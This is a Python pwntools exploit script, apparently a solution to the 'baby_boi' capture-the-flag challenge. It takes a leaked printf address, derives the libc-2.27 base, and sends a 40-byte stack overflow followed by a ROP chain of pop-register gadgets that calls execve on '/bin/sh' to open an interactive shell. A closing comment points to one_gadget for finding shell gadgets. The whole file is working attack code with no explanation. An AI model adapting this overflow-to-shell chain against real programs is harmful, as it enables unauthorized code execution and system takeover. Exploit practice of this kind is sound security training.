#!/usr/bin/python3
from pwn import *
p = process('./baby_boi')
libc = ELF('libc-2.27.so')
getline = lambda : p.recvline(timeout=1).decode('utf-8').strip('\n')
if p:
	print(getline())
	s = getline()
	print(s)
	printf = int(s[s.find('0'):], 16)
	log.info("printf is at: "+str(printf))
	offset = printf - libc.symbols['printf']
	target = 0x4f322 + offset
	exploit = b'a'*40
	exploit += p64(offset + 0x439c8) # `pop rax ; ret`
	exploit += p64(59) # execve's syscall number, popped into rax
	exploit += p64(offset + 0x2155f) # `pop rdi ; ret`
	exploit += p64(offset + 0x1b3e9a) # "/bin/sh"
	exploit += p64(offset + 0x1306d9) # `pop rdx ; pop rsi ; ret`
	exploit += p64(0) # NULL, popped into rdx
	exploit += p64(0) # NULL, popped into rsi
	exploit += p64(offset + 0xd2975) # `syscall; ret`
	print(exploit)
	p.send(exploit)
	p.interactive()
# to find shell gadget:
# one_gadget libc-2.27.so
